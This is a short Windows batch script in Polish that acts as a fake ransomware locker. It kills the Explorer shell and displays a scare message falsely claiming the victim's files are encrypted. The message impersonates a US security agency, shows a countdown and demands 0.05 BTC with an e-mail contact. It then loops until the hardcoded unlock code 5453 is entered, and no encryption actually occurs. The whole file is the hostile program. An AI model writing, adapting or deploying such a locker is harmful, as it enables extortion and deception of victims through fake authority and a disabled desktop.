@echo off
taskkill /f /im explorer.exe
cls
echo Twoje wazne pliki som zaszyfrowane
echo CYBER.POLICE Amerykanska agencja bezpieczenstwa narodowego
echo Pozostaly czas:                 3-12-32-5
echo Adres Bitcoina:                 Desctyptor-100$3208757.btc
echo Jak dokonac platnosci? Wyslij 0.05 BTC pod adres Descryptor1-100$3208757.btc
echo                                                        0.010 - 1000 zl - 100 dolars
echo Po dokonaniu platnosci skontaktuj sie z nami, aby uzyskac odszyfrowanie
echo E-mail:crypt32+ w proton dot you
set code=""

:code
set /p code="Wpisuj kod:"
if "%code%"=="5453" goto correct
if NOT "%code%"=="5453" goto wrong

:correct
start explorer
echo Kod jest raczej dobry ale jeszcze musi go sprawdzic administrator
pause

:wrong
echo Kod jest fatalny!!!
goto code
